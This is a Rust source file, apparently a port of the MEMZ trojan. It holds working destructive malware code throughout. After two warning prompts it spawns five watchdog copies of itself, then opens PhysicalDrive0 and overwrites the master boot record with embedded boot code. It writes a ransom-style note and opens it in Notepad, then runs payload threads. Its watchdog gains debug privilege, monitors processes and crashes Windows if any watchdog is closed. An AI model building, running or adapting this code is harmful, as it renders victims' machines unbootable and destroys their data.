#[cfg(feature = "DEBUG_MODE")]
use memz_rs::utils::log;
#[cfg(feature = "DEBUG_MODE")]
use memz_rs::utils::log::*;

use memz_rs::{
    convert_str::{ToPCSTRWrapper, ToPCWSTRWrapper},
    data::{
        self,
        code::{CODE1, CODE1_LEN, CODE2, CODE2_LEN},
        msg::{MEMZ_MSGBOXA_1, MEMZ_MSGBOXA_2},
    },
    payloads::{
        callback::{kill_windows, window_proc},
        function::{payload_thread, N_PAYLOADS, PAYLOADS},
    },
    s_v,
    winapi_type::DWORD,
    wrap_windows_api::*,
    LMEM_ZEROINIT, MEM_ZEROINIT,
};
use std::{
    ffi::c_void,
    mem::size_of,
    process,
    thread::{self, sleep},
    time::Duration,
};
use windows::{
    core::{PCSTR, PCWSTR},
    s, w,
    Win32::{
        Foundation::{
            GetLastError, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, HMODULE, HWND,
            INVALID_HANDLE_VALUE,
        },
        Graphics::Gdi::HBRUSH,
        Security::SE_DEBUG_NAME,
        Storage::FileSystem::{
            WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_FLAGS_AND_ATTRIBUTES,
            FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        System::{
            Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
            Threading::{
                CreateThread, OpenProcess, HIGH_PRIORITY_CLASS, LPTHREAD_START_ROUTINE,
                PROCESS_QUERY_INFORMATION, THREAD_CREATION_FLAGS,
            },
        },
        UI::{
            Shell::{ShellExecuteExW, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOW},
            WindowsAndMessaging::{
                CreateWindowExA, DispatchMessageA, TranslateMessage, CS_HREDRAW, CS_VREDRAW,
                HCURSOR, HICON, HMENU, IDYES, MB_ICONWARNING, MB_YESNO, MSG, SM_CXSCREEN,
                SM_CYSCREEN, SW_SHOWDEFAULT, WINDOW_EX_STYLE, WINDOW_STYLE, WNDCLASSEXA,
            },
        },
    },
};

fn main() -> Result<(), WinError> {
    #[cfg(feature = "DEBUG_MODE")]
    log::new_log();
    let (_scrw, _scrh) = (
        wrap_get_system_metrics(SM_CXSCREEN)?,
        wrap_get_system_metrics(SM_CYSCREEN)?,
    );

    let argv = if std::env::args().collect::<Vec<_>>().is_empty() {
        None
    } else {
        Some(std::env::args().collect::<Vec<_>>())
    };
    let argc = argv.clone().unwrap().len();
    let arg = if argc > 1 {
        argv.unwrap()[1].clone()
    } else {
        "No Args".to_owned()
    };

    if arg == "/watchdog" {
        unsafe {
            match CreateThread(
                None,
                usize::default(),
                LPTHREAD_START_ROUTINE::Some(watchdog_thread),
                None,
                THREAD_CREATION_FLAGS::default(),
                None,
            ) {
                Ok(h) => h,
                Err(e) => panic!("Failed CreateThread\n{e:?}")
            };
        }

        let c: WNDCLASSEXA = WNDCLASSEXA {
            cbSize: size_of::<WNDCLASSEXA>() as u32,
            style: CS_HREDRAW | CS_VREDRAW,
            lpfnWndProc: Some(window_proc),
            cbClsExtra: 0,
            cbWndExtra: 0,
            hInstance: HMODULE::default(),
            hIcon: HICON::default(),
            hCursor: HCURSOR::default(),
            hbrBackground: HBRUSH::default(),
            lpszMenuName: PCSTR::null(),
            lpszClassName: s!("hax"),
            hIconSm: HICON::default(),
        };

        wrap_register_class_ex_a(&c)?;

        let hwnd = unsafe {
            CreateWindowExA(
                WINDOW_EX_STYLE::default(),
                s!("hax"),
                PCSTR::null(),
                WINDOW_STYLE::default(),
                0,
                0,
                100,
                100,
                HWND::default(),
                HMENU::default(),
                HMODULE::default(),
                None,
            )
        };

        if hwnd.0 == 0 {
            panic!("CreateWindowExA is NULL\n")
        }

        let mut msg: MSG = Default::default();
        while wrap_get_message(&mut msg, hwnd, 0, 0)? {
            unsafe {
                if !TranslateMessage(&msg).as_bool() {
                    #[cfg(feature = "DEBUG_MODE")]
                    write_log(
                        LogType::ERROR,
                        LogLocation::LOG,
                        "Failed TranslateMessage()\nError: message is not translated",
                    );
                    return Err(WinError::Failed);
                };

                DispatchMessageA(&msg); // return value generLOGy is ignored
            };
        }
    } else {
        if wrap_messagebox_a(
            HWND(0),
            s_v!(MEMZ_MSGBOXA_1),
            "MEMZ",
            MB_YESNO | MB_ICONWARNING,
        )? != IDYES
            || wrap_messagebox_a(
                HWND(0),
                s_v!(MEMZ_MSGBOXA_2),
                "MEMZ",
                MB_YESNO | MB_ICONWARNING,
            )? != IDYES
        {
            process::exit(0);
        }

        let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // LocalAlloc 8192 * 2
        wrap_get_module_file_name(HMODULE::default(), &mut fn_buf)?;

        let path = String::from_utf16(&fn_buf).expect("Cannot convert fn_buf");
        let file_path = path.replace('\0', "");
        #[cfg(feature = "DEBUG_MODE")]
        dbg!(&file_path);
        for _ in 0..5 {
            wrap_shell_execute_w(
                HWND(0),
                PCWSTR::null(),
                *file_path.as_str().to_pcwstr(),
                w!("/watchdog"),
                PCWSTR::null(),
                SW_SHOWDEFAULT,
            )?;
        }

        let mut info = SHELLEXECUTEINFOW {
            cbSize: size_of::<SHELLEXECUTEINFOW>() as u32,
            fMask: SEE_MASK_NOCLOSEPROCESS,
            hwnd: HWND::default(),
            lpVerb: PCWSTR::null(),
            lpFile: *file_path.as_str().to_pcwstr(),
            lpParameters: w!("/main"),
            lpDirectory: PCWSTR::null(),
            nShow: SW_SHOWDEFAULT.0 as i32,
            hInstApp: HMODULE::default(),
            ..Default::default()
        };

        unsafe {
            if ShellExecuteExW(&mut info).as_bool() {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(LogType::INFO, LogLocation::MSG, "ShellExecuteExW successed");
            } else {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                    LogLocation::LOG,
                    &format!(
                        "Failed ShellExecuteExW()\nGetLastError: {:?}",
                        GetLastError()
                    ),
                );
                #[cfg(not(feature = "DEBUG_MODE"))]
                panic!(
                    "Failed ShellExecuteExW()\nGetLastError: {:?}",
                    GetLastError()
                )
            }
        }

        wrap_set_priority_class(info.hProcess, HIGH_PRIORITY_CLASS.0)?;

        process::exit(0);
    }

    let drive = wrap_create_file_a(
        *"\\\\.\\PhysicalDrive0".to_pcstr(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_FLAGS_AND_ATTRIBUTES::default(),
        HANDLE::default(),
    )
    .unwrap();

    let mut boot_code = vec![MEM_ZEROINIT; 65536];
    boot_code[..CODE1_LEN].copy_from_slice(&CODE1[..CODE1_LEN]);
    boot_code[0x1fe..(0x1fe + CODE2_LEN)].copy_from_slice(&CODE2[..CODE2_LEN]);

    let mut wb: DWORD = Default::default();

    if !unsafe { WriteFile(drive, Some(&boot_code), Some(&mut wb), None).as_bool() } {
        #[cfg(feature = "DEBUG_MODE")]
        write_log(
            LogType::ERROR,
            LogLocation::LOG,
            &format!("Failed CreateFileA()\nGetLastError: {:?}", unsafe {
                GetLastError()
            }),
        );
        return Err(WinError::Failed);
    }

    wrap_close_handle(drive)?;

    let note = wrap_create_file_a(
        "\\note.txt",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        HANDLE::default(),
    )
    .unwrap();

    if !unsafe { WriteFile(note, Some(data::msg::MSG.as_bytes()), Some(&mut wb), None).as_bool() } {
        #[cfg(feature = "DEBUG_MODE")]
        write_log(
            LogType::ERROR,
            LogLocation::LOG,
            &format!("Failed CreateFileA()\nGetLastError: {:?}", unsafe {
                GetLastError()
            }),
        );
        return Err(WinError::Failed);
    }

    wrap_close_handle(note)?;

    wrap_shell_execute_w(
        HWND::default(),
        PCWSTR::null(),
        "notepad",
        "\\note.txt",
        PCWSTR::null(),
        SW_SHOWDEFAULT,
    )?;

    for payload in PAYLOADS.iter().take(N_PAYLOADS) {
        sleep(Duration::from_millis(payload.delay as u64));
        let payload_thread = thread::spawn(move || payload_thread(payload));
        payload_thread.join().unwrap();
    }

    loop {
        sleep(Duration::from_millis(10000))
    }
}

unsafe extern "system" fn watchdog_thread(_param: *mut c_void) -> u32 {
    let mut oproc = 0;
    let mut f_buf1: Vec<u8> = vec![MEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
    wrap_get_process_image_filename_a(&mut f_buf1).expect("Failed GetProcessImageFilenameA");
    #[cfg(feature = "DEBUG_MODE")]
    {
        let data = format!("f_buf1: {}", std::str::from_utf8(&f_buf1).unwrap());
        let data = data.replace("\0", "");
        write_log(LogType::INFO, LogLocation::LOG, &data);
        sleep(Duration::from_millis(500));
    }
    sleep(Duration::from_millis(1000));

    set_privilege(SE_DEBUG_NAME, true).expect("Failed SetPrivilege");

    #[cfg(feature = "DEBUG_MODE")]
    {
        write_log(
            LogType::INFO,
            LogLocation::LOG,
            &format!("{}", dbg!(set_privilege(SE_DEBUG_NAME, true)?)),
        );
    }
    loop {
        let snapshot = wrap_create_toolhelp32_snapshot().expect("Failed CreateTool32Snapshot");
        #[cfg(feature = "DEBUG_MODE")]
        {
            write_log(
                LogType::INFO,
                LogLocation::LOG,
                &format!("{:?}", dbg!(&snapshot)),
            );
            sleep(Duration::from_millis(500));
        }
        let mut proc: PROCESSENTRY32 = PROCESSENTRY32 {
            dwSize: size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        unsafe {
            Process32First(snapshot, &mut proc);
            #[cfg(feature = "DEBUG_MDOE")]
            {
                let file = std::str::from_utf8(&proc.szExeFile).unwrap();
                let file = file.replace('\0', "");

                let th32_process_id = format!(
                    "Process32First() proc.th32ProcessID: {}",
                    proc.th32ProcessID
                );
                let sz_exe_file = format!("Process32First() proc.szExeFile: {}", file);
                write_log(LogType::INFO, LogLocation::LOG, &th32_process_id);
                write_log(LogType::INFO, LogLocation::LOG, &sz_exe_file);
                sleep(Duration::from_millis(500));
            }
        }

        let mut nproc = 0;
        loop {
            let mut h_proc: Option<HANDLE> = None;
            if proc.th32ProcessID != 0 {
                unsafe {
                    h_proc = match OpenProcess(
                        PROCESS_QUERY_INFORMATION, // Permission Denined: PROCESS_QUERY_INFORMATION
                        FALSE,
                        proc.th32ProcessID,
                    ) {
                        Ok(handle) => Some(handle),
                        Err(e) => {
                            let data = "OpenProcessError: The target process is running with administrator privileges or is a protected process.";
                            #[cfg(not(feature = "DEBUG_MODE"))]
                            panic!("{}\n{e:?}\n", data);
                            #[cfg(feature = "DEBUG_MODE")]
                            {
                                write_log(
                                    LogType::ERROR,
                                    LogLocation::LOG,
                                    &format!("{}\n{}\n", data, dbg!(&e)),
                                );
                                None
                            }
                        }
                    };
                }
            }
            #[cfg(feature = "DEBUG_MODE")]
            {
                write_log(
                    LogType::INFO,
                    LogLocation::LOG,
                    &format!("{:?}\n", dbg!(&h_proc)),
                );
                sleep(Duration::from_millis(500));
            }
            let mut f_buf2: Vec<u8> = vec![MEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
            wrap_get_process_image_filename_a(&mut f_buf2).expect("Failed GetProcessImageFilenameA");
            #[cfg(feature = "DEBUG_MODE")]
            {
                let data = format!("f_buf2: {}", std::str::from_utf8(&f_buf2).unwrap());
                let data = data.replace('\0', "");
                write_log(LogType::INFO, LogLocation::LOG, &format!("{}\n", data));
                sleep(Duration::from_millis(500));
            }
            if f_buf1 != f_buf2 {
                nproc += 1;
                #[cfg(feature = "DEBUG_MODE")]
                {
                    write_log(
                        LogType::INFO,
                        LogLocation::LOG,
                        &format!("{}\n", dbg!(&nproc)),
                    );
                    sleep(Duration::from_millis(500));
                }
            }

            wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE)).expect("Failed CloseHandle");
            drop(f_buf2);

            #[cfg(not(feature = "DEBUG_MODE"))]
            if !wrap_process32_next(snapshot, &mut proc) {
                break;
            }
            #[cfg(feature = "DEBUG_MODE")]
            if dbg!(!wrap_process32_next(snapshot, &mut proc)) {
                break;
            }

            if proc.th32ProcessID == 0 {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                    LogLocation::LOG,
                    "Unable to open system process",
                );
                #[cfg(not(feature = "DEBUG_MODE"))]
                panic!("Unable to open system process");
            }

            #[cfg(feature = "DEBUG_MODE")]
            {
                let file = std::str::from_utf8(&proc.szExeFile).unwrap();
                let file = file.replace('\0', "");
                let th32_process_id =
                    format!("Process32Next() proc.th32ProcessID {}", proc.th32ProcessID);
                let sz_exe_file = format!("Process32Next() proc.szExeFile: {}", file);
                write_log(LogType::INFO, LogLocation::LOG, &th32_process_id);
                write_log(LogType::INFO, LogLocation::LOG, &sz_exe_file);
                sleep(Duration::from_millis(500));
            }
        }
        wrap_close_handle(snapshot).expect("Failed CloseHandle");

        if nproc < oproc {
            kill_windows().expect("Failed KillWindows Proc");
        }
        oproc = nproc;

        sleep(Duration::from_millis(10));
    }
}
